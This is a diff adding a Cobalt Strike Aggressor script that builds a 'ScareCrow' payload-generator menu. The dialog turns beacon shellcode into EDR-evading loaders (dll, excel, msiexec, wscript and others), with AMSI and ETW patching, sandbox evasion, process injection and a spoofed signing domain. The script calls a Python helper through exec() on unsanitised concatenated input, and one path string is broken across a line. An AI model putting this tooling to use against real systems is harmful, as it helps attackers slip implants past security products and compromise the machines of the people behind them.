@@ -1,0 +1,139 @@
+############################################################
+# Please do not use / at the end of the directories!
+############################################################
+#Path to the ScareCrow-CobaltStrike repository you just cloned.
+$script_path = "/opt/RedTeamHelp/ScareCrow-CobaltStrike";
+#Path to the compiled ScareCrow Go executable of the installation.
+$scarecrow_executable = "/opt/RedTeamHelp/ScareCrow
+";
+############################################################
+
+$loader = "";
+$domain = "";
+$injection = "";
+$noamsi = "";
+$noetw = "";
+$nosleep = "";
+$sandbox = "";
+$custom_bin = "";
+$loader_name = "";
+$shellcode = "";
+
+menubar("ScareCrow", "scare_crow");
+
+popup scare_crow {
+    item "&Generate Payload" {
+        ScareCrow();
+    }
+}
+
+sub ScareCrow {
+    local('$dialog %defaults');
+    %defaults["domain"] = "www.microsoft.com";
+
+    $dialog = dialog("ScareCrow Payload Generator", %defaults, &mainCallback);
+    dialog_description($dialog, "Generate EDR evasion payloads. (#) for optional, (*) for required options.");
+    drow_listener_stage($dialog, "listener", "(*) Listener: ");
+    drow_file($dialog, "custom_binary", "(#) Custom x64 Shellcode: ");
+    drow_combobox($dialog, "payload_type", "(*) Payload Type: ", @("Stageless"));
+    drow_combobox($dialog, "architecture", "(*) Architecture: ", @("x64"));
+    drow_combobox($dialog, "loader", "(*) Loader: ", @("binary", "control", "dll", "excel", "msiexec", "wscript"));
+    drow_checkbox($dialog, "noamsi", "(#) Disable AMSI patching (enabled by default)");
+    drow_checkbox($dialog, "noetw", "(#) Disable ETW patching (enabled by default)");
+    drow_checkbox($dialog, "nosleep", "(#) Disable the sleep delay");
+    drow_checkbox($dialog, "sandbox", "(#) Sandbox evasion");
+    drow_text($dialog, "injection", "(#) Process Injection: ");
+    drow_text($dialog, "domain", "(*) Domain (Change if using it against Windows systems): ");
+    dbutton_action($dialog, "Generate Payload");
+    dbutton_help($dialog, "https://github.com/GeorgePatsias/ScareCrow-CobaltStrike");
+    dialog_show($dialog);
+}
+
+sub loaderDialog {
+    local('$dialog %defaults');
+
+    $dialog = dialog("ScareCrow Payload Generator (S)", %defaults, &loaderDialogCallback);
+    dialog_description($dialog, "Specify loader name for the payload e.g. Loader.js or Loader.hta - (**Optional For Control payloads)");
+    drow_text($dialog, "loader_name", "Loader name: ");
+    dbutton_action($dialog, "Generate");
+    dbutton_help($dialog, "https://github.com/GeorgePatsias/ScareCrow-CobaltStrike");
+    dialog_show($dialog);
+}
+
+sub loaderDialogCallback {
+    $loader_name = $3["loader_name"];
+    GeneratePayload();
+}
+
+sub mainCallback {
+    if ($3["listener"] eq "") {
+        show_message("Please specify a listener!");
+        exit();
+    }
+
+    $loader = $3["loader"];
+    $domain = $3["domain"];
+    $noamsi = $3["noamsi"];
+    $noetw = $3["noetw"];
+    $nosleep = $3["nosleep"];
+    $sandbox = $3["sandbox"];
+    $custom_bin = $3["custom_binary"];
+    $injection = $3["injection"];
+
+    if ($injection ne "" && $noetw eq "false"){
+        show_message("Cannot use Process Injection and ETW patching together. Disable ETW patching if you want to do a Process Injection");
+        exit();
+    }
+
+    if ($custom_bin ne ""){   
+        $shellcode_file = openf($custom_bin);
+        $shellcode = readb($shellcode_file, -1);
+        closef($shellcode_file);
+    }else{
+        $shellcode = artifact_payload($3["listener"], "raw", $3["architecture"]);
+    }
+
+    if ($loader eq "binary"){
+        GeneratePayload();
+    } else if ($loader eq "dll"){
+        GeneratePayload();
+    }else if ($loader eq "control"){
+        loaderDialog();
+    }else if ($loader eq "excel"){
+        loaderDialog();
+    }else if ($loader eq "msiexec"){
+        loaderDialog();
+    }else if ($loader eq "wscript"){
+        loaderDialog();
+    }
+}
+
+sub GeneratePayload {
+    prompt_file_save("scbeacon.bin", {
+        show_message("Generating payload, please wait... You can close this dialog while you wait.");
+
+        $handle = openf(">" . $1);
+        writeb($handle, $shellcode);
+        closef($handle);
+
+        $arguments = '{';
+        $arguments = $arguments . '"scarecrow_executable":' . '"' . $scarecrow_executable . '"' . ',';
+        $arguments = $arguments . '"payload":' . '"' . $1 . '"' . ',';
+        $arguments = $arguments . '"loader":' . '"' . $loader . '"' . ',';
+        $arguments = $arguments . '"domain":' . '"' . $domain . '"' . ',';
+        $arguments = $arguments . '"noamsi":' . '"' . $noamsi . '"' . ',';
+        $arguments = $arguments . '"noetw":' . '"' . $noetw . '"' . ',';
+        $arguments = $arguments . '"nosleep":' . '"' . $nosleep . '"' . ',';
+        $arguments = $arguments . '"sandbox":' . '"' . $sandbox . '"' . ',';
+        $arguments = $arguments . '"injection":' . '"' . $injection . '"' . ',';
+        $arguments = $arguments . '"loader_name":' . '"' . $loader_name . '"' . ',';
+        $arguments = $arguments . '"script_path":' . '"' . $script_path . '"';
+        $arguments = $arguments . '}';
+
+        $data = exec("python3 " . $script_path . "/Helper.py" . " " . $arguments);
+
+        $helper_response = readAll($data);
+
+        show_message($helper_response); 
+    });  
+}
